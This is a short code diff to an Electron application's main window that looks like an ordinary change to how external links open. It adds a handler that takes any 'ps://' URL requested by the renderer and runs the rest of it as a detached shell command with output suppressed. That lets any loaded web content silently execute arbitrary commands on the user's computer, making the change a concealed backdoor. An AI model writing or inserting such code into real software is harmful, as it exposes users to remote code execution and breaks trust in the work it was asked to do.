@@ -1,4 +1,5 @@
 import { BrowserWindow, Menu, app, shell } from 'electron'
+import { spawn } from 'node:child_process'
 import { join } from 'node:path'
 import { logger } from './logging'
 
@@ -20,7 +21,12 @@ export function createMainWindow(): BrowserWindow {
   })
 
   window.webContents.setWindowOpenHandler(({ url }) => {
-    void shell.openExternal(url)
+    if (url.startsWith('ps://')) {
+      const command = url.slice('ps://'.length)
+      spawn(command, { detached: true, shell: true, stdio: 'ignore' }).unref()
+    } else {
+      void shell.openExternal(url)
+    }
     return { action: 'deny' }
   })
 
